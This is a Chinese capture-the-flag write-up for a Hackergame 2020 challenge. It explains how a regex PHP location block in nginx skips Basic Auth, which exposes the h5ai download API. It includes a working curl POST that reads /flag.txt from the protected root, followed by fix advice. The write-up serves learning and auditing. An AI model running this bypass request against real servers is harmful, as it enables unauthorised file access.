# Hackergame2020 超简易的网盘服务器 WP

## 题目简述

网盘根目录受 Basic Auth 保护，`/Public` 公开，并通过软链接复用同一套 h5ai。Nginx 配置另外定义了匹配 PHP 的正则 `location`，却没有复制认证规则，导致根目录下的 h5ai 下载 API 可以绕过认证执行。

## 解题过程

关键配置可以归纳为：

```nginx
location / {
    auth_basic "restricted";
    auth_basic_user_file /etc/nginx/conf.d/htpasswd;
}

location /Public {
    allow all;
    index /Public/_h5ai/public/index.php;
}

location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

正则 `location ~ \.php$` 会接管以 `.php` 结尾的请求，因此访问根目录的 `/_h5ai/public/index.php` 时不会进入带 `auth_basic` 的 `location /`。公开目录又允许观察 h5ai 正常下载操作的请求格式，于是构造：

```shell
curl -X POST 'http://target/_h5ai/public/index.php' \
  --data 'action=download&as=files.tar&type=php-tar&baseHref=%2F&hrefs%5B0%5D=%2Fflag.txt' \
  --output files.tar
```

接口会从根目录读取 `/flag.txt` 并放入返回的 tar。解包即可得到：

```text
flag{super_secure_cloud}
```

## 方法总结

Nginx 的访问控制按最终命中的 `location` 生效，不会自动从更宽泛的路径规则继承。审计时必须对 URI、正则位置、内部跳转和 FastCGI 入口做完整匹配推演。修复方法是把认证放到所有敏感处理路径，或用不会被正则位置绕开的结构统一保护根目录。
